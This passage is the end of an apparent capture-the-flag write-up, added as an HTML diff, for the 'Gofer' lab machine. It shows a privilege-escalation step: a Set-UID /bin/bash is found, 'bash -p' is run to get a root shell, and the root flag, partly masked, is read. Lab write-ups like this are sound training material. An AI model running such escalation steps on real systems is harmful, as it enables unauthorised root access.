+<span class="mi">7</span><span class="p">)</span> <span class="n">Delete</span> <span class="n">a</span> <span class="n">note</span>
+<span class="mi">8</span><span class="p">)</span> <span class="n">Backup</span> <span class="n">notes</span>
+<span class="mi">9</span><span class="p">)</span> <span class="n">Quit</span>
+<span class="o">========================================</span>
+
+
+<span class="n">Your</span> <span class="n">choice</span><span class="p">:</span>
+</pre></div>
+
+No errors have been returned, so it appears that everything has worked correctly.<br/><br/>
+When listing the privileges of <code>/bin/bash</code>, we observe that it is <code>Set-UID</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">1234376</span> <span class="n">Mar</span> <span class="mi">27</span>  <span class="mi">2022</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span>
+</pre></div>
+
+Now, by specifying the <code>-p</code> parameter, we can execute commands as root and view the final flag:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@tbuckley@gofer</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">bash</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1"># </span><span class="n">whoami</span>
+<span class="n">root</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1"># </span><span class="n">cat /root/root.txt</span>
+<span class="mi">5</span><span class="n">c398</span><span class="o">********************</span><span class="mi">5167</span><span class="n">e</span>
+<span class="n">bash</span><span class="o">-</span><span class="mf">5.1</span><span class="root1">#</span>
+</pre></div></br></br></br></br></br></br></br></br></br></br></br></br></br>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2023 elswix.github.io</p>
+    </footer>
+</body>
+</html>
